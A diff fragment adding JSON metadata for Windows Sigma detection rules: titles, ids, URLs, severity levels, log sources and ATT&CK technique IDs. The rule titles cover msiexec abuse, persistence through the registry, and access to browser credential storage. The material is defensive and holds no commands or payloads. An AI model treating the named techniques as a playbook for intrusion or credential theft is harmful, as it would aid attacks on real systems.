+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1218.007"
+        ]
+      },
+      {
+        "title": "Suspicious Msiexec Execute Arbitrary DLL",
+        "id": "6f4191bb-912b-48a8-9ce7-682769541e6d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_execute_dll.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "command_line",
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.007"
+        ]
+      },
+      {
+        "title": "Msiexec Quiet Installation",
+        "id": "79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_install_quiet.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.007"
+        ]
+      },
+      {
+        "title": "Suspicious Msiexec Quiet Install From Remote Location",
+        "id": "8150732a-0c9d-4a99-82b9-9efb9b90c40c",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_install_remote.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.007"
+        ]
+      },
+      {
+        "title": "Potential MsiExec Masquerading",
+        "id": "e22a6eb2-f8a5-44b5-8b44-a2dbd47b1144",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_masquerading.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.005"
+        ]
+      },
+      {
+        "title": "MsiExec Web Install",
+        "id": "f7b5f842-a6af-4da5-9e95-e32478f3cd2f",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1105",
+          "T1218.007"
+        ]
+      },
+      {
+        "title": "InstallerFileTakeOver LPE CVE-2021-41379 File Create Event",
+        "id": "3be82d5d-09fe-4d6a-a275-0d40d234d324",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2021/Exploits/CVE-2021-41379/file_event_win_cve_2021_41379_msi_lpe.yml",
+        "level": "critical",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows"
+        },
+        "attack": [
+          "T1068"
+        ]
+      },
+      {
+        "title": "Raspberry Robin Initial Execution From External Drive",
+        "id": "2c6bea3a-ef58-4f2e-a775-4928f6b7c58a",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2022/Malware/Raspberry-Robin/proc_creation_win_malware_raspberry_robin_external_drive_exec.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001"
+        ]
+      },
+      {
+        "title": "DarkGate - Autoit3.EXE Execution Parameters",
+        "id": "f8e9aa1c-14f2-4dbd-aa59-b98968ed650d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/DarkGate/proc_creation_win_malware_darkgate_autoit3_from_susp_parent_and_location.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059"
+        ]
+      },
+      {
+        "title": "Mint Sandstorm - ManageEngine Suspicious Process Execution",
+        "id": "58d8341a-5849-44cd-8ac8-8b020413a31b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/TA/Mint-Sandstorm/proc_creation_win_apt_mint_sandstorm_manage_engine_susp_child_process.yml",
+        "level": "critical",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "PaperCut MF/NG Exploitation Related Indicators",
+        "id": "de1bd0b6-6d59-417c-86d9-a44114aede3b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/TA/PaperCut-Print-Management-Exploitation/proc_creation_win_papercut_print_management_exploitation_indicators.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "PaperCut MF/NG Potential Exploitation",
+        "id": "0934ac71-a331-4e98-a034-d49c491fbbcb",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/TA/PaperCut-Print-Management-Exploitation/proc_creation_win_papercut_print_management_exploitation_pc_app.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious Child Process of SolarWinds WebHelpDesk",
+        "id": "8c7f4a2d-3b9e-4f1c-9a6d-2e8f5c3d9a1b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-40551/proc_creation_win_exploit_cve_2025_40551.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1190"
+        ]
+      },
+      {
+        "title": "File Creation Date Changed to Another Year",
+        "id": "558eebe5-f2ba-4104-b339-36f7902bcc1a",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/file/file_change/file_change_win_date_changed_to_another_year.yml",
+        "level": "low",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "file_change",
+          "product": "windows"
+        },
+        "attack": [
+          "T1070.006"
+        ]
+      },
+      {
+        "title": "Creation of an Executable by an Executable",
+        "id": "297afac9-5d02-4138-8c58-b977bac60556",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/file/file_event/file_event_win_susp_binary_dropper.yml",
+        "level": "low",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1587.001"
+        ]
+      },
+      {
+        "title": "Potential Suspicious Execution From GUID Like Folder Names",
+        "id": "90b63c33-2b97-4631-a011-ceb0f47b77c3",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_execution_from_guid_folder_names.yml",
+        "level": "low",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1027"
+        ]
+      },
+      {
+        "title": "Potential Executable Run Itself As Sacrificial Process",
+        "id": "bafd07c6-3ea5-454a-b4be-058fbb073de7",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_parent_execute_itself.yml",
+        "level": "low",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1055"
+        ]
+      },
+      {
+        "title": "Suspicious File Access to Browser Credential Storage",
+        "id": "a1dfd976-4852-41d4-9507-dc6590a3ccd0",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_access/file_access_win_susp_process_access_browser_cred_files.yml",
+        "level": "low",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "file_access",
+          "product": "windows"
+        },
+        "attack": [
+          "T1217",
+          "T1555.003"
+        ]
+      },
+      {
+        "title": "Files With System Process Name In Unsuspected Locations",
+        "id": "d5866ddf-ce8f-4aea-b28e-d96485a20d3d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_creation_system_file.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.005"
+        ]
+      },
+      {
+        "title": "Suspicious DotNET CLR Usage Log Artifact",
+        "id": "e0b06658-7d1d-4cd3-bf15-03467507ff7c",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
+        "title": "PowerShell Module File Created By Non-PowerShell Process",
+        "id": "e3845023-ca9a-4024-b2b2-5422156d5527",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_powershell_module_uncommon_creation.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potential WSL Binary Modification from Installed Location",
+        "id": "2f400434-01e1-416b-b52c-bb5bfbb9eb78",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_wsl_binary_modification.yml",
+        "level": "medium",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.005",
+          "T1218"
+        ]
+      },
+      {
+        "title": "Suspicious Volume Shadow Copy VSS_PS.dll Load",
+        "id": "333cdbe8-27bb-4246-bf82-b41a0dca4b70",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/image_load/image_load_dll_vss_ps_susp_load.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "image_load",
+          "product": "windows"
+        },
+        "attack": [
+          "T1490"
+        ]
+      },
+      {
+        "title": "HTML Help HH.EXE Suspicious Child Process",
+        "id": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_hh_html_help_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047",
+          "T1059.001",
+          "T1059.003",
+          "T1059.005",
+          "T1059.007",
+          "T1218",
+          "T1218.001",
+          "T1218.010",
+          "T1218.011",
+          "T1566",
+          "T1566.001"
+        ]
+      },
+      {
+        "title": "Suspicious MsiExec Embedding Parent",
+        "id": "4a2a2c3e-209f-4d01-b513-4155a540b469",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_embedding.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_command_line"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1218.007"
+        ]
+      },
+      {
+        "title": "Suspicious Microsoft OneNote Child Process",
+        "id": "c27515df-97a9-4162-8a60-dc0eeb51b775",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_onenote_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1566",
+          "T1566.001"
+        ]
+      },
+      {
+        "title": "Suspicious Outlook Child Process",
+        "id": "208748f7-881d-47ac-a29c-07ea84bf691d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_outlook_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1204.002"
+        ]
+      },
+      {
+        "title": "Suspicious Microsoft Office Child Process",
+        "id": "438025f9-5856-4663-83f7-52f878a70a50",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047",
+          "T1204.002",
+          "T1218.010"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious Execution Of PDQDeployRunner",
+        "id": "12b8e9f5-96b2-41e1-9a42-8c6779a5c184",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_pdqdeploy_runner_susp_children.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potentially Suspicious Powershell Script Execution From Temp Folder",
+        "id": "a6a39bdb-935c-4f0a-ab77-35f4bbf44d33",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_script_exec_from_temp_folder.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001"
+        ]
+      },
+      {
+        "title": "Change PowerShell Policies to an Insecure Level",
+        "id": "87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_set_policies_to_unsecure_level.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1059.001"
+        ]
+      },
+      {
+        "title": "Exchange PowerShell Snap-Ins Usage",
+        "id": "25676e10-2121-446e-80a4-71ff8506af47",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_snapins_hafnium.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1114"
+        ]
+      },
+      {
+        "title": "Potential Defense Evasion Via Rename Of Highly Relevant Binaries",
+        "id": "0ba1da6d-b6ce-4366-828c-18826c9de23e",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_renamed_binary_highly_relevant.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.003"
+        ]
+      },
+      {
+        "title": "Suspicious Usage Of ShellExec_RunDLL",
+        "id": "d87bd452-6da1-456e-8155-7dc988157b7d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_susp_shellexec_execution.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious ShellExec_RunDLL Call Via Ordinal",
+        "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_susp_shellexec_ordinal_execution.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "parent_command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.011"
+        ]
+      },
+      {
+        "title": "Rundll32 Execution With Uncommon DLL Extension",
+        "id": "c3a99af4-35a9-4668-879e-c09aeb4f2bdf",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_uncommon_dll_extension.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.011"
+        ]
+      },
+      {
+        "title": "Scheduled Task Creation Masquerading as System Processes",
+        "id": "9f8573c9-22b4-40e3-89c1-72bc2b8d49ab",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_system_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.004",
+          "T1036.005",
+          "T1053.005"
+        ]
+      },
+      {
+        "title": "Script Event Consumer Spawning Process",
+        "id": "f6d1dd2f-b8ce-40ca-bc23-062efb686b34",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_scrcons_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047"
+        ]
+      },
+      {
+        "title": "Potential Shim Database Persistence via Sdbinst.EXE",
+        "id": "517490a7-115a-48c6-8862-1a481504d5a8",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_sdbinst_shim_persistence.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1546.011"
+        ]
+      },
+      {
+        "title": "Suspicious Serv-U Process Pattern",
+        "id": "58f4ea09-0fc2-4520-ba18-b85c540b0eaf",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_servu_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1555"
+        ]
+      },
+      {
+        "title": "Always Install Elevated Windows Installer",
+        "id": "cd951fdc-4b2f-47f5-ba99-a33bf61e3770",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_always_install_elevated_windows_installer.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line",
+          "image",
+          "parent_command_line"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1548.002"
+        ]
+      },
+      {
+        "title": "Suspicious Eventlog Clearing or Configuration Change Activity",
+        "id": "cc36992a-4671-4f21-a91d-6c2b72a2edf5",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_eventlog_clear.yml",
+        "level": "high",
+        "status": "stable",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1685.001",
+          "T1685.005"
+        ]
+      },
+      {
+        "title": "Script Interpreter Execution From Suspicious Folder",
+        "id": "1228c958-e64e-4e71-92ad-7d429f4138ba",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_script_exec_from_env_folder.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059"
+        ]
+      },
+      {
+        "title": "System File Execution Location Anomaly",
+        "id": "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_system_exe_anomaly.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036"
+        ]
+      },
+      {
+        "title": "Suspicious Velociraptor Child Process",
+        "id": "4bc90587-e6ca-4b41-be0b-ed4d04e4ed0c",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_velociraptor_child_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1219"
+        ]
+      },
+      {
+        "title": "Suspicious WMIC Execution Via Office Process",
+        "id": "e1693bc8-7168-4eab-8718-cdcaa68a1738",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wmic_susp_execution_via_office_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1047",
+          "T1204.002",
+          "T1218.010"
+        ]
+      },
+      {
+        "title": "Suspicious WmiPrvSE Child Process",
+        "id": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wmiprvse_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1047",
+          "T1204.002",
+          "T1218.010"
+        ]
+      },
+      {
+        "title": "Cscript/Wscript Potentially Suspicious Child Process",
+        "id": "b6676963-0353-4f88-90f5-36c20d443c6a",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wscript_cscript_susp_child_processes.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Removal of Potential COM Hijacking Registry Keys",
+        "id": "96f697b0-b499-4e5d-9908-a67bec11cdb6",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_delete/registry_delete_removal_com_hijacking_registry_key.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "registry_delete"
+        },
+        "attack": [
+          "T1112"
+        ]
+      },
+      {
+        "title": "Security Support Provider (SSP) Added to LSA Configuration",
+        "id": "eeb30123-9fbd-4ee8-aaa0-2e545bbed6dc",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_event/registry_event_ssp_added_lsa_config.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "registry_event",
+          "product": "windows"
+        },
+        "attack": [
+          "T1547.005"
+        ]
+      },
+      {
+        "title": "Registry Persistence via Service in Safe Mode",
+        "id": "1547e27c-3974-43e2-a7d7-7f484fb928ec",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_set/registry_set_add_load_service_in_safe_mode.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "registry_set",
+          "product": "windows"
+        },
+        "attack": [
+          "T1564.001"
+        ]
+      },
+      {
+        "title": "Office Autorun Keys Modification",
+        "id": "baecf8fb-edbf-429f-9ade-31fc3f22b970",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_office.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "registry_set",
+          "product": "windows"
+        },
+        "attack": [
+          "T1547.001"
+        ]
+      },
+      {
+        "title": "WinSock2 Autorun Keys Modification",
+        "id": "d6c2ce7e-afb5-4337-9ca4-4b5254ed0565",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_winsock2.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "registry_set",
+          "product": "windows"
+        },
+        "attack": [
+          "T1547.001"
+        ]
+      },
+      {
+        "title": "Wow6432Node CurrentVersion Autorun Keys Modification",
+        "id": "b29aed60-ebd1-442b-9cb5-16a1d0324adb",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_wow6432node.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "registry_set",
+          "product": "windows"
+        },
+        "attack": [
+          "T1547.001"
+        ]
+      },
+      {
+        "title": "Potential Persistence Via Visual Studio Tools for Office",
+        "id": "9d15044a-7cfe-4d23-8085-6ebc11df7685",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_set/registry_set_persistence_office_vsto.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "registry_set",
+          "product": "windows"
+        },
+        "attack": [
